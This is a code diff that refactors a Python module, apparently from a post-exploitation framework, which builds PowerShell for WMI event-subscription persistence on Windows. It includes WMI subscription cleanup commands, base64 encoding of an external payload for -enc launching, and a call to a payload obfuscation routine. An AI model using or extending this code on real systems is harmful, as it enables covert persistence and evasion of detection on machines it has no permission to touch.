@@ -16,11 +16,6 @@ class Module(object):
     @staticmethod
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
 
-        # Set booleans to false by default
-        obfuscate = False
-
-        launcher_prefix = params['Launcher']
-        
         # trigger options
         daily_time = params['DailyTime']
         day = params['Day']
@@ -30,13 +25,10 @@ class Module(object):
         dummy_sub_name = "_" + sub_name
 
         # management options
+        launcher_prefix = params['Launcher']
         ext_file = params['ExtFile']
         cleanup = params['Cleanup']
         web_file = params['WebFile']
-        s_bypasses = params['Bypasses']
-        if (params['Obfuscate']).lower() == 'true':
-            obfuscate = True
-        obfuscate_command = params['ObfuscateCommand']
 
         status_msg = ""
         location_string = ""
@@ -50,19 +42,19 @@ class Module(object):
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -filter \"name='" + dummy_sub_name + "'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object { $_.filter -match '" + dummy_sub_name + "'} | Remove-WmiObject;"
             script += "'WMI persistence with subscription named " + sub_name + " removed.'"
-            
+
+            script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
             return script
 
         if ext_file != '':
             # read in an external file as the payload and build a 
             #   base64 encoded version as encScript
             if os.path.exists(ext_file):
-                f = open(ext_file, 'r')
-                fileData = f.read()
-                f.close()
+                with open(ext_file, 'r') as f:
+                    file_data = f.read()
 
                 # unicode-base64 encode the script for -enc launching
-                enc_script = helpers.enc_powershell(fileData)
+                enc_script = helpers.enc_powershell(file_data)
                 status_msg += "using external file " + ext_file
 
             else:
@@ -139,10 +131,6 @@ class Module(object):
 
 
         script += "'WMI persistence established "+status_msg+"'"
-        script = data_util.keyword_obfuscation(script)
 
-        if main_menu.obfuscate:
-            script = data_util.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=main_menu.obfuscateCommand)
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(script=script, script_end='', obfuscate=obfuscate, obfuscation_command=obfuscation_command)
         return script
